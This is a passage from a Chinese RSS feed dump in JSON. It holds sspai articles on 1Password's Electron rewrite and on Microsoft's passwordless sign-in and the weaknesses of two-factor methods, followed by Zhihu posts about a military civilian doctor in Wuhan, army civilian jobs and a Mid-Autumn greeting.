href=\"https://daringfireball.net/linked/2020/03/20/mac-assed-mac-apps\">“Mac-assed” Mac app</a>），以此来要求和批评 1Password 是不合适的。</p>\n<p>例如，设计师 Matt Birchler <a href=\"https://birchtree.me/blog/desktop-apps-aint-what-they-used-to-be/\">撰文指出</a>：</p>\n<blockquote><p>[Things、Reeder、iStat Menus 和 Craft] 都是优秀的原生 Mac 应用，但它们用的定制 UI 元素可谓五花八门。</p></blockquote>\n<blockquote><p>1Password 7 的 UI 哪部分是遵循 Mac 惯例或与系统内置 UI 元素相同的？[…] 与新版相比怎么就更像一个原生 Mac 应用了呢？</p></blockquote>\n<blockquote><p>当今世界上，大多数人都在浏览器中完成大量工作，没有明确理由就不会另装一个应用；因此，Mac 上的原生与非原生应用之争，更多是一种学究而非务实。诚然，Electron 应用可能很差，但你在弃坑之前总得实际用用，知道它差在哪。同理，一个原生应用也未必就快速、轻量、可靠……macOS 版的「音乐」应用就是一例。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/ba59cd4d0eb67fa8504774972a196b2e\" alt=\"\"></figure><p>其他一些辩护角度还包括：</p>\n<ul>\n<li>Casey Liss 在播客 <a href=\"https://atp.fm/444\">Accidental Tech Podcast</a> 中认为，<strong>选用 Electron 的影响要结合应用的使用场景判断</strong>。以 1Password 为例，除了初始设置时需要多花些时间整理和导入密码，此后需要与界面打交道的机会并不多（某种程度上说，1Password 的价值和目标，正是让用户花在「查密码」这件事上的时间尽可能短暂）。因此，界面是不是原生对于用户体验的影响就很有限了。</li>\n<li>Stephen Hackett 在播客 <a href=\"https://www.relay.fm/connected/359\">Connected</a> 中提出，1Password <strong>提高对企业用户的重视程度是商业上合理的选择</strong>。随着各大操作系统、浏览器纷纷推出和完善密码管理功能，可以预见将有越来越多的普通用户选择这些现成方案，导致 1Password 的市场机会受到蚕食。因此，转向企业市场是必要的。</li>\n</ul>\n<h2>相关事件/延伸阅读</h2>\n<p><strong>用 Electron 框架制作出原生质感的应用并非天方夜谭。</strong> GitHub 通知管理工具 Lotus 的开发者<a href=\"https://getlotus.app/21-making-electron-apps-feel-native-on-mac\">讨论</a>了如何从窗口加载、标题栏可拖拽区域、字体选用、鼠标指针、菜单设置等细节入手，让 Electron 尽可能贴近原生效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/f89a2a5b991a7040da1d508caa840b37\" alt=\"\"></figure><p><strong>1Password 并不是第一个因转向 Electron 和订阅制而被受到质疑的 Mac 应用。</strong> 2020 年 4 月，另一款颇具口碑的老牌备份工具 Arq <a href=\"https://www.arqbackup.com/blog/arq-6-more-power-more-security-more-storage-savings/\">宣布推出第 6 版</a>，同样采用 Electron 编写界面部分（后台进程则继续使用 Objective-C），并取消了部分用户惯用的旧版功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/df21d2b051c67cc2b276d3e924d91587\" alt=\"\"></figure><p>在收到大量负面评价后，开发者在几天后即<a href=\"https://www.arqbackup.com/blog/arq-6-next-steps/\">出面道歉</a>，宣布将逐渐加回缺失的功能。不到一年后的 2021 年 2 月，下一个大版本 <a href=\"https://www.arqbackup.com/blog/arq-7-released/\">Arq 7</a> 完全放弃了 Electron，重新用回了原生框架编写界面。</p>\n","link":"https://sspai.com/post/68892"},{"title":"微软想让你不再动手输密码了，这个省事的方案有多安全？","date":"2021-09-23 06:30:32","description":"\n<blockquote><p>Beginning today, you can now completely remove the password from your Microsoft account.</p></blockquote>\n<p>2021 年 9 月 15 日，微软安全、合规和身份副总裁（Corporate Vice President, Security, Compliance and Identity）Vasu Jakkal <a href=\"https://www.microsoft.com/security/blog/2021/09/15/the-passwordless-future-is-here-for-your-microsoft-account/\" target=\"_blank\">宣布</a> 用户在登录微软旗下的账号时（具体范围参见下文）再也不用输入那些难缠的密码了。微软的这一举动引发了不少关注，毕竟对于无密码一事大家莫衷一是。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561ftlb34tdol81mpa0.png\"><figcaption>当你在微软启用无密码登录以后（图片来自于微软网站）</figcaption></figure><p>其实微软的「无密码」之路早有端倪，在 2017 年，微软就在先前 Microsoft Authenticator 两步验证的基础之上，<a href=\"https://techcommunity.microsoft.com/t5/azure-active-directory-identity/no-password-phone-sign-in-for-microsoft-accounts/ba-p/245254\" target=\"_blank\">允许</a> 用户免密（不用输入密码）登录微软账户。Microsoft Authenticator 目前已经不止于两步验证，更多用法可参见文章 <a href=\"https://sspai.com/post/65633\" target=\"_blank\">密码管理，多一种选择</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fttb34te7d7m58v0.png\"><figcaption>使用 Microsoft Authenticator 进行无密码登录（图片来自于微软网站）</figcaption></figure><p>2018 年，微软再进一步，<a href=\"https://www.microsoft.com/en-us/microsoft-365/blog/2018/04/17/windows-hello-fido2-security-keys/\" target=\"_blank\">支持</a> FIDO2 安全密钥的无密码登录。安装了 Windows 10 2018 年 10 月更新的用户可以通过设置 Windows Hello （网络摄像头或者指纹读取器）或者来自 Yubico‎‎ / ‎‎FEITIAN‎‎ 的支持 FIDO2 标准的安全密钥设备，并通过 Edge 访问微软账户设置，将账户与 Windows 10 电脑相连，这样就可以实现无密码访问。</p>\n<p>2019 年，微软 <a href=\"https://blogs.windows.com/windows-insider/2019/07/10/announcing-windows-10-insider-preview-build-18936/#W56yUs3oRz1wvLzI.97\" target=\"_blank\">首次</a> 为 Windows 10 引入了无密码登录， 而在今年 3 月，微软为商业用户 <a href=\"https://techcommunity.microsoft.com/t5/azure-active-directory-identity/passwordless-authentication-is-now-generally-available/ba-p/1994700\" target=\"_blank\">引入</a> 了无密码登录。</p>\n<h2>微软所说的无密码是什么？</h2>\n<p>其实如果你使用过 Microsoft Authenticator，那么对于微软此次提到的无密码应该不至于太陌生。毕竟在使用 Microsoft Authenticator 登录 Outlook 邮箱的时候，就不用输入密码。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fu5b34tdookl6g4g.gif\"><figcaption>Microsoft Authenticator ，无需输入密码便捷登录微软服务</figcaption></figure><p>微软所说的无密码其实就是允许用户删除账户密码。密码删除之后，用户可以通过 Microsoft Authenticator 应用、 Windows Hello、FIDO2 安全密钥等这样的一些无密码的身份验证方法来登录。</p>\n<p>目前微软旗下的 Microsoft 365、Teams、Outlook、OneDrive、Family Safety（微软家长监护服务）以及<s>微软边缘浏览器</s> Microsoft Edge 已经 <a href=\"https://blogs.windows.com/windowsexperience/2021/09/15/microsoft-announces-passwordless-future-available-across-microsoft-edge-and-microsoft-365-apps/\" target=\"_blank\">可以</a> 无密码化了。对于那些想感受无密的用户而言，可以参照微软的 <a href=\"https://support.microsoft.com/zh-cn/account-billing/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-microsoft-%E5%B8%90%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%AF%86%E7%A0%81%E8%AE%BF%E9%97%AE-4d4b4267-7d04-4402-9aac-4436a063d004\" target=\"_blank\">帮助文档</a> 进行操作。</p>\n<p>需要注意的是，对于较旧版本的 Windows、应用和服务仍然需要密码。这当中包括：</p>\n<ol>\n<li>Xbox 360</li>\n<li>Office 2010 或更早版本</li>\n<li>Office for Mac 2011 或更早版本</li>\n<li>使用 IMAP 和 POP 电子邮件服务的产品和服务</li>\n<li>Windows 8.1、Windows 7 或更早版本</li>\n<li>一些Windows包括远程桌面和凭据管理器的功能</li>\n<li>某些命令行和任务计划程序服务。</li>\n</ol>\n<h2>使用密码为什么会不安全？</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fudb34te7d7m58vg.png\"><figcaption>场景的认证手段（图片来自于微软网站）</figcaption></figure><p>很多人都已经认识到了采用「12356」这样密码的安全性问题。这种安全性问题给用户和网站两方都产生了一定的影响。用户转向使用 1password、Microsoft Edge 等 App 自动生成的强密码；网站要求用户采用包括字母大小写、数字、符号等要素的最低8位的密码成为一种常态。然而，不管是前者还是后者都对用户的记忆力提出了挑战。</p>\n<p>所以在这种情况之下，（尽管知道这样不安全）很多人就开始了「一码用万站」，或者用简单的口诀（密码公式）来记忆密码，如数字＋网站的形式（比如 0755sspai ）。这两种方式，前者能占到 10%，而后者则高达 40%。抛开网站不讲，日常中也充斥着使用相同密码的例子，大部分人名下的银行卡密码都是相同的。</p>\n<blockquote><p>我向来<i>知道哪条路是对的</i>，但我从来不走，……因为 TMD 的难了。</p></blockquote>\n<p>与己方便，自然也会与人方便。容易记住的密码，自然也就更容易被黑客猜到。一旦黑客攻击网站得手或者网站本身发生密码泄露，那么用户采用了相同的密码的其他网站就会受到波及。轻则个人隐私信息流出，重则影响到个人的财产安全。</p>\n<h3>两步认证是如何保证密码安全的？</h3>\n<p>在前文中，我们已经了解到密码使用中存在的一些问题。为了更好提升用户账户的安全性，在密码验证的基础之上，厂商又推出了多重要素验证（Multi-factor authentication，缩写为 MFA）用来在账户登录的时候提供额外的保护。在 MFA 中有一个特例，两步认证（2-Step Verification，也称 Two-factor authentication，缩写为2FA）经常被使用。</p>\n<p>在今天我们的网络生活乃至线下的生活中，我们能够见到各种各样的两步认证方案。</p>\n<h4>PIN 码</h4>\n<p>PIN 码，即用户个人识别码（Personal identification number，缩写为 PIN）。它是一串数字组成用于确认用户身份的授权通行码。这种两步认证方式在银行卡系统中比较常见。</p>\n<h4>基于时间的一次性密钥和 One-time passcodes</h4>\n<p>基于时间的一次性密钥（Time based one-time passcode，缩写 TOTP）是一种常见的动态密码产生方式，它是一种根据预共享的密钥与当前时间计算一次性密码的 <a href=\"https://zh.wikipedia.org/wiki/%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95\" target=\"_blank\">算法</a>，顾名思义主要基于时间为服务器与密代码生成器的同步条件。登录/验证时利用密码生成器产生动态密码，过时不用或者验证之后该密码自动失效。常见的 TOTP 密钥生成器主要分为软件和硬件，前者如 Google 身份验证器和 Microsoft Authenticator，后者比如网易的将军令、一些银行的动态密码令牌。</p>\n<p>这里所提到的 One-time passcodes 是指在设置完两步认证之后，服务的提供商可能会让你备份的另外几个代码，这些代码将起到救命稻草的作用，比如用户在丢失了 TOTP 以后用来进行两步认证。比如在 iPhone 开启两步认证之后，Apple 给用户生成的恢复密钥。</p>\n<h4>短信 / 语音电话 / 邮件</h4>\n<p>短信（或语音电话）与邮件也是一种比较常见的两步认证方式。前者在使用银行进行在线交易的时候会经常用到；而后者在登录某些网络服务的时候也必不可少，比如 Notion 开始之初就是走的邮箱路线。</p>\n<p>而对于那些开启了两部认证的 Gmail 用户来讲，当在陌生电脑上登录的时候，Google 也发送相应的短信进行二次验证。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fudb34te7d7m5900.png\"><figcaption>Google 登录时提供了多种多样的两步认证机制</figcaption></figure><h4>Apple iOS 服务发来的两步认证与 Google App 里的「确认」</h4>\n<p>作为手机界的两强，iOS 背后的 Apple 和 Android 背后的 Google 在两步认证上各有各的招数。</p>\n<p>对于 iOS 和 Mac的用户来讲，Apple ID的两部验证应当不会感到陌生。在 iOS 9 或 OS X El Capitan 及以上版本系统的设备，都可以开启双重认证。Apple ID 两步验证开启之后，后续的每次更改账户信息，苹果的服务器都会发代码到授信设备上以验证登陆者的身份。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/26902\" target=\"_blank\">如何开启 Apple ID 两步验证，预防隐私泄露</a></p>\n<p>而对于使用 Google 服务的用户而言，除了会收到上文所提到的短信，他还会在登录的邮箱及辅助邮箱中收到一封 Google 发来的登录确认邮件；即便是登录未遂，同样两个邮箱也会收到提醒邮件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fulb34tdol81mpag.png\"><figcaption>提供给邮件额外进行一次提醒</figcaption></figure><p> </p>\n<h4>手机 / 设备 / 单独硬件的生物识别</h4>\n<p>生物识别技术现在多指对生物体（一般特指人）本身的生物特征来区分生物体个体的计算机技术。日常中比较常见的生物识别主要包括指纹和人脸。</p>\n<p>这当中的例子对于我们来讲最熟悉不过的就是信用卡的在线开卡了，手机充当一个生物识别的硬件，人脸则是认证通过的「密钥」。在微软无密码化的布局中，Windows Hello 也是有使用到生物识别，</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561futb34te7d7m590g.png\"><figcaption>Windows Hello 面容与指纹信息，图片来自于微软网站</figcaption></figure><h4>单独的硬件密钥</h4>\n<p>硬件密钥由于采用了硬件设备而不是传统上的密码来处理身份验证，因而其安全性得以提高。这种密钥通常是 USB 设备，也有采用蓝牙或者 NFC 等形式。在日常中登录银行网站使用的 U 盾其实就是硬件密钥的一种。</p>\n<p>在使用中，网站可以通过调用 WebAuthn API 的形式访问硬件密钥。微软在无密码登录中也支持硬件密钥登录方式，不过需要 FIDO2 标准。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fv5b34tdol81mpb0.jpeg\"><figcaption>Yubico 的硬件安全密钥，图片来自于微软网站</figcaption></figure><h2>无密码之后，再看两步认证方式的安全性</h2>\n<p>世上并不存在完美无瑕的东西，两步认证也是一样。在没有密码以后，上面提到的这些两步认证方式也或多或少的存在一些问题，而这些两步认证的方式也是这次微软无密码认证中的重要组成。</p>\n<p>这当中首当其冲的就是他们在面对黑客攻击时是十分脆弱的。在这些攻击当中，通道劫持（Channel Jacking）和实时的网络钓鱼因其攻击成本较低是无密码身份证验证器被攻击的主要方式。</p>\n<p>以通道劫持为例。许多身份验证器都是靠通信通道来工作的。这当中对于我们来讲，更为熟知的可能就是诈骗短信了。根据微软的 <a href=\"https://techcommunity.microsoft.com/t5/azure-active-directory-identity/all-your-creds-are-belong-to-us/ba-p/855124#:~:text=All%20Authenticators%20Are%20Vulnerable%20%20%20Credential%20,indicates%20approva%20\" target=\"_blank\">数据</a>，日常中我们常见的通道占比大致是电子邮件（55%）、短信（44%）、推送通知（4%）和语音通话（1%）。这当中通过服务器进行传输的一次性密码易发生通道劫持的情况。</p>\n<blockquote><p>手机获得登录验证码的时候，手机（以及相关的移动运营商、基础设施、客户支持和 SIM 卡等）就是这里所提到的通道。</p></blockquote>\n<p>而在网络钓鱼的问题上，早在 1987 年网络钓鱼就已经 <a href=\"https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB\" target=\"_blank\">出现</a>。网络钓鱼通常引导用户到网址与接口与真实站点近乎克隆的网址上输入个人信息，进而套取用户的个人数据乃至资产信息。尽管道理大家都懂，但是事实上直到今天，打击网络钓鱼的行为，更进一步讲侦测网站是否是「假货」在实际上仍然很困难。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fv5b34te7d7m5910.png\"><figcaption>微软借用罗马神话中的双头雅努斯（Janus）来阐述网络钓鱼，图片来自于微软网站</figcaption></figure><p>上文中提到的基于时间的一次性密码（TOTP）、 Microsoft Authenticator 这样的身份验证应用程序都有可能发生实时网络钓鱼的问题。</p>\n<p>除了行走在网络中的黑客，现实中的一些问题也是绕不过去的：肩窥（Shoulder surf，站在别人身后，视线越过他人的肩膀偷窥输密码的行为）、TOTP 设备可能发生的电量用完与时钟不同步、实体设备 / 载体被盗……</p>\n<p>除了上面这些问题之外，对于硬件来讲，绕不过去的还有一个质量问题。尽管厂商用各种措施来保障，但质量问题一旦发生其影响对于用户来讲是非常严重的。稍加检索，我们不难发现各种硬件厂商召回的消息。</p>\n<h2>写在最后</h2>\n<p>没有了密码，也就不会密码被盗。微软这种从源头上取消密码的做法倒也不失为一种思路。在一步步推进无密码化的同时，微软也已经在其内部践行无密码的理念。按照 Vasu Jakkal <a href=\"https://www.microsoft.com/security/blog/2021/09/15/the-passwordless-future-is-here-for-your-microsoft-account/\" target=\"_blank\">所说</a>，在微软几乎 100% 的公司雇员已经在使用无密码登录的方式登录他们的公司账户。</p>\n<p>然而对于无密码化而言，尽管微软给出了「简单、快速、安全」这样的高评价；但这并不意味着，这条无密码之路走起来一片坦途。</p>\n<p>暂且不说无密码化在推行的过程中会遇到的各种老旧系统与服务的兼容性问题，光是一个解决方案中的联网问题就够让用户头大了。一旦无法访问互联网或者网络故障，那么用户剩下的就只是焦虑了。</p>\n<p>在无密码化的推行的过程当中，微软遇到的最重要的一个问题可能就是改变用户的观念了。说服用户接受一个无密码的账户，这并非易事。我们可以近似的类比一下现实中信用卡密码有无的问题。即便是微软的体量如何之巨，敢为天下先，但微软人数毕竟只是茫茫人海中的一粒沙。</p>\n<p>此外，即便是微软的无密码化取得了成功，它也会面临一个大范围推广的问题。网络上成千上万种服务的都会涉及到密码的问题，这些服务背后的厂商他们是否愿意与微软进行合作，用户是否放心他们之间进行合作，这些都是一个打问号的事情。</p>\n<p>最后，就我个人而言，虽然已经用 Microsoft Authenticator 取代了 1Password 的部分功能，但是目前依然是保持观望，没有追随微软步伐、删掉密码的打算。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，每天了解科技圈的新鲜事 📰</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68936"},{"title":"军队文职上岸是一种怎样的体验？","date":"2021-09-23 04:02:24","description":"\n<p>2020年2月24日，空降兵部队医院内科楼呼吸科，一场<b>特殊的入党宣誓仪式</b>正在举行。</p>\n<p>“我志愿加入中国共产党，拥护党的纲领，遵守党的章程，履行党员义务，执行党的决定……”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-25467d141ed2f64c072babadadb48cb8_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-25467d141ed2f64c072babadadb48cb8\" data-watermark-src=\"v2-0658c364022e0c99c0705d0fef39a0ad\" data-private-watermark-src=\"v2-df9da2ffb531324bde4d1f20aca94503\"></p>\n<p>庄严的宣誓声来自该病区的相对清洁区，<b>一位肩扛文职军衔的94年小姑娘</b>，在心内科廖奕华书记的带领下，在干部空勤科的邓静修医生、呼吸科的刘瑛医生、董鑫医生、刘燕护士长的见证下，戴着口罩，<b>面对党旗，高举右拳，眼神坚定，铿锵宣誓。在抗击疫情的一线正式成为一名中国共产党预备党员。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-00b0456986b5235292d067960ba379f6_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-00b0456986b5235292d067960ba379f6\" data-watermark-src=\"v2-6c38d0b7d2278ff601c00266b36aa368\" data-private-watermark-src=\"v2-3782b603445b9d546782f2c40c171439\"></p>\n<p>这位在特殊的时间、特殊的地点加入党组织的90后小姑娘叫刘娟，文职人员，是一名呼吸科的医生。入党仪式礼成后，身材娇小的她激动不已，她对笔者说道：<b>“此时此刻，我身在武汉防控一线，怀着激动的心情接受着党的洗礼，倍感光荣，同时又深感压力。今后我会时刻以一名共产党员的身份严格要求自己，甘于奉献，勇于牺牲；为人民群众的生命健康，勇往直前，用实际行动来证实初心。”</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a77153fbc8516cb13d0a07f9eff9908f_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-a77153fbc8516cb13d0a07f9eff9908f\" data-watermark-src=\"v2-1f35642618aac646d270decfe4369b2f\" data-private-watermark-src=\"v2-ef2e432258809911373ab760a12c313e\"></p>\n<p>刘娟出生在湖北省荆州市公安县南平镇，是家里的独生女。1998年发生洪灾，南平镇是洪水重灾区，人民英雄李向群为了南平镇的抗洪救灾，牺牲在了一线。那个时候的刘娟听说李向群先进事迹后，深受感动，暗暗在心里告诉自己要向烈士那样全心全意为人民服务，不怕苦，不怕累，不怕牺牲。</p>\n<p>2012年，刘娟考入湖北中医药大学，在大学里刘娟受到了更加全面系统的党的理论知识学习，更坚定了共产主义信仰，积极向党组织靠拢，并一直以党员的标准要求自己。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-31bbec050247fa953c706070cfebaab5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"458\" data-watermark=\"watermark\" data-original-src=\"v2-31bbec050247fa953c706070cfebaab5\" data-watermark-src=\"v2-a3caeae5d53457fc4577b5e5aeb563bf\" data-private-watermark-src=\"v2-88d777bc8249830114c2252797927b7c\"></p>\n<p>刘娟研究生毕业后，考上了空降兵部队医院文职人员。在集训过程中，刘娟对党和军队有了更深的了解。<b>明白作为军人要严格地做到令行禁止和不讲条件的执行，牢固树立姓军为兵，姓军为战的思想。刘娟很快从地方人员转变为军队人员，真切感受到担负的使命和责任。</b></p>\n<p>回到医院后，刘娟很快投入住院医师的工作，认真负责，尽心尽力为患者减轻痛苦。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8e28998fee0b556162d738d8b960c026_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-8e28998fee0b556162d738d8b960c026\" data-watermark-src=\"v2-0c5863dfbd982b0573717d227cddf1a9\" data-private-watermark-src=\"v2-99c1d401366b2dd679a9c53aaaf14af0\"></p>\n<p>今年1月，随着新冠病毒在武汉迅速蔓延，面对病毒的挑战，刘娟没有退缩，一直坚守在一线。</p>\n<p>在科室缺乏防护装备的时候；在病患人数不断增加，病人的体温此起彼伏、病情变化迅速的时候；在值班24小时，双手颤抖，病例仍然写不完的时候，<b>刘娟没有气馁，再苦再累，风险再大，作为一名医生，救死扶伤是使命。</b></p>\n<p>面对生病的武汉，疫情是敌人，要打赢这场攻坚战，就要载着军医的使命，坚守岗位，将自己的所学所得发挥最大效用。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0948cb3534b58b20aa20ff1f51cfd2ed_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"watermark\" data-original-src=\"v2-0948cb3534b58b20aa20ff1f51cfd2ed\" data-watermark-src=\"v2-93f9dc49f641deb24db5dcd21d451463\" data-private-watermark-src=\"v2-9ee21c2e5a2c26531e34ec9c96420c1a\"></p>\n<p>刘娟的入党介绍人呼吸科主任严峻告诉笔者，年前有位进医院的患者，入院的时候病情危重，俯着身子坐在轮椅上，双手微颤，呼吸急促，额头满布汗水，大大的眼睛布满红血丝，极度缺氧。</p>\n<p>当时因为新冠指南未出，治疗方案尚未统一，医院还没有特别有效的抗病毒药物，采取对症处理，把氧气开放到最大，但患者仍呼吸困难，不能平卧。患者的检查结果出来后，发现情况很糟糕，科室要给患者家属下病危通告，但不把真实情况告诉患者。</p>\n<p>刘娟不顾自己工作的繁忙，一有空就会去病房查房，告诉患者情况还好不要有太大压力，并不断地鼓励他积极配合治疗，保持好的心态，共同把这段最难熬时间扛过去，病自然就好了。科学的药物治疗，加上刘娟每天的不断鼓励，患者情况出现慢慢的好转，指脉氧上升，可以平躺睡眠，可以不戴氧气，可以下地活动，直到精神好转，顺利出院。</p>\n<p>同为刘娟入党介绍人的呼吸科护士长刘燕告诉笔者，有一位70岁的老爹爹，是个孤寡老人，一直独居在家。这个爹爹是刘娟接诊的，比较有意思的是爹爹住进来的时候，塞给刘娟一张纸条，上面密密麻麻写着自己的症状流水：什么时候发病、怎么不舒服、用过什么药、服药后有什么不适等等。</p>\n<p>刘娟知道这是个很“讲究”的爹爹，便放心地告诉爹爹他们会采取怎样的治疗方式，爹爹也会每天塞给她一张早早就写下的单子，详细记录了他的症状、体征。因为老人入院住得急，有一些生活用品没带，又怕自己外出传染给别人，就在当天塞给刘娟的症状流水中加了一栏：需要帮忙采购的生活用品。</p>\n<p>刘娟看到后，二话没说，第二天上班前按照“购物单”的要求买了物品送过去，爹爹很感激。爹爹的病情恢复得也很快。爹爹出院的时候刘娟正好在查房，看见爹爹正好在写纸条，凑过去看，上面密密麻麻写了自己回家的注意事项，什么时候解除隔离。这些都是刘娟平时告诉爹爹的，看来爹爹都听得很认真。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-088a62dec00224e312a4b8a8d29ee2db_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-088a62dec00224e312a4b8a8d29ee2db\" data-watermark-src=\"v2-a786c36ac075b47e2ef397107ea58673\" data-private-watermark-src=\"v2-57c654d6db47777b6a735448bc816689\"></p>\n<p><b>“用爱拥抱每一天，用心呵护每一人。”这是刘娟常常挂在嘴边的一句话，也是她的人生信条。</b></p>\n<p>“行动是最好的入党誓言，不管龙潭虎穴，哪怕九死一生，我绝不畏惧。”</p>\n<p>这就是我们火线入党的同志——刘娟，用娇小的身躯奋力抵住疫情的蔓延。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-men-de-tian-kong-31-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">我们的天空</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480982101/answer/2071916643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">119 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/440306057?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有靠谱的军队文职课程？</a><br><a href=\"http://www.zhihu.com/question/377474469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">备考军队文职学习视频应该看哪家的？</a><br>\n","link":"http://www.zhihu.com/question/480982101/answer/2071916643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"军队文职上岸是一种怎样的体验？","date":"2021-09-23 04:01:40","description":"\n<p>很多人对于军队文职不了解，甚至不知道是干嘛的，其实这也很正常</p>\n<p>军队文职是从18年才开始大规模的面向社会开始招生的，还是太年轻了</p>\n<p>给大家总结了一些军队文职的相关经验和问题，感兴趣的话就点进来看看吧</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/chao-ge-ge-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">文职君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480982101/answer/2083243001?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">119 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/440306057?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有靠谱的军队文职课程？</a><br><a href=\"http://www.zhihu.com/question/377474469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">备考军队文职学习视频应该看哪家的？</a><br>\n","link":"http://www.zhihu.com/question/480982101/answer/2083243001?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"921逢中秋，航小科祝您中秋快乐！","date":"2021-09-22 12:09:42","description":"\n<p>月满中秋，阖家团圆。   </p>\n<p>中国载人航天工程于1992年9月21日由中国政府批准实施，代号“921工程”，是中国空间科学实验的重大战略工程之一。</p>\n<p>1992年9月21日，中央政治局常委会批准我国载人航天工程按“三步走”发展战略实施。2010年9月25日，中央政治局常委会议批准《载人空间站工程实施方案》，载人空间站工程正式启动实施。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5007a9674dc5c2828e2ecec4ae2b394f_b.jpg\" data-rawwidth=\"1000\" data-rawheight=\"2041\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic4.zhimg.com/v2-5007a9674dc5c2828e2ecec4ae2b394f_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-hang-tian-ke-gong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国航天科工</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a 